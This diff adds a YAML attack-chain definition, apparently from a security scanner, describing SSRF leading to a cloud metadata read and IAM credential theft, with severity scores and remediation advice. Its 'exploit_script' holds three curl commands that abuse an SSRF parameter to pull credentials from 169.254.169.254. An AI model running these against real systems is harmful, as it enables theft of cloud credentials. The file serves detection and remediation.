@@ -1,0 +1,42 @@
+id: CHAIN-005
+name: "SSRF → 元数据读取 → 密钥泄露"
+severity: CRITICAL
+cvss: 9.0
+epss: 0.70
+
+steps:
+  - step: 1
+    name: "SSRF注入点"
+    rule: py.ssrf.requests
+    description: "requests访问用户可控URL"
+    condition: "URL未验证直接请求"
+
+  - step: 2
+    name: "元数据服务访问"
+    rule: metadata_access
+    description: "访问云元数据服务"
+    condition: "http://169.254.169.254/latest/meta-data/"
+
+  - step: 3
+    name: "密钥泄露"
+    rule: credential_leak
+    description: "获取IAM凭证"
+    condition: "读取 security-credentials/"
+
+exploit_script: |
+  # Step 1: 检测SSRF
+  curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
+
+  # Step 2: 获取IAM角色
+  curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+  # Step 3: 获取凭证
+  curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
+
+remediation:
+  priority: P0
+  effort: "2小时"
+  suggestions:
+    - "实施URL白名单验证"
+    - "禁止访问内网IP和元数据服务"
+    - "使用IMDSv2要求HTTP头"
